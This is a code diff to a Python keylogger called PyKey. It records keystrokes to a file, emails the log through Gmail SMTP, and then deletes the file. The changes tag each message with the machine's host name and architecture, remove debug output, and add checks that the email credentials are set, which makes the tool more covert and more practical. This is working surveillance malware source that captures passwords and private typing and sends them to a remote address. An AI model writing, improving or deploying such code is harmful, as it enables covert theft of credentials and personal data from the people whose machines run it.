@@ -10,11 +10,8 @@ from email.mime.application import MIMEApplication
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.utils import COMMASPACE, formatdate
-
-
-
-
-
+import datetime
+import os
 
 
 class PyKey:
@@ -27,7 +24,7 @@ class PyKey:
         self.EMAIL_TO=''
         self.GMAIL_USER=''
         self.GMAIL_PWD=''
-        self.LOG_FILE = 'text.txt'
+        self.LOG_FILE = ''
         self.TERMINATE_KEY = "esc"
         self.CLEAR_ON_STARTUP = False
         self.MAP = {
@@ -84,25 +81,42 @@ class PyKey:
             Arguments:
                 self (PyKey): self instance
         """
-        SUBJECT = 'Test'
+        now = datetime.datetime.now()
+        SUBJECT = 'PyKey - ' + str(now) + ' - ' + platform.node() + ' ' + platform.machine()
 
         with open(self.LOG_FILE, 'r') as myfile:
             data=myfile.read().replace('\n', '')
 
-        TEXT = data
+        TEXT = '''\
+        - PyKey - {now}.
+        - Date: {now}.
+        - Machine: {machine}.
+        - Data:
+          {data}
+        \
+        '''.format(now=now, machine=platform.node() + ' ' + platform.machine(), data=data)
 
         message = """From: %s\nTo: %s\nSubject: %s\n\n%s
         """ % (self.EMAIL_FROM, self.EMAIL_TO, SUBJECT, TEXT)
         try:
+            if self.GMAIL_USER == '' or self.GMAIL_PWD == '':
+                print("Error: Email account credentials not specified")
+                sys.exit(errno.EACCES)
+
+            if self.EMAIL_FROM == '' or self.EMAIL_TO == '':
+                print("Error: Email sender or received not specified")
+                sys.exit(errno.EACCES)
+
             server = smtplib.SMTP("smtp.gmail.com", 587)
             server.ehlo()
             server.starttls()
             server.login(self.GMAIL_USER, self.GMAIL_PWD)
             server.sendmail(self.EMAIL_FROM, self.EMAIL_TO, message)
             server.close()
-            print("successfully sent the mail")
+            os.remove(self.LOG_FILE)
         except:
-            print("failed to send mail")
+            print("Error: failed to send email")
+            sys.exit(errno.EACCES)
 
 
     def onPress(self, key):
@@ -177,8 +191,6 @@ class PyKey:
             if not modifier and event.event_type == "down":
                 return
 
-                print(key)
-
             if modifier:
                 if event.event_type == "down":
                     if is_down.get(key, False):
@@ -188,8 +200,7 @@ class PyKey:
                 elif event.event_type == "up":
                     is_down[key] = False
 
-                key = " [{} ({})] ".format(key, event.event_type)
-                #logging.log(10,'{}'.format(keyName))
+                key = ""
             elif key == "\r":
                 key = "\n"
             output.write(key)
@@ -236,10 +247,6 @@ class PyKey:
             sys.exit(errno.EACCES)
 
         self.recordKeys()
-
-
-
-
 
 
 
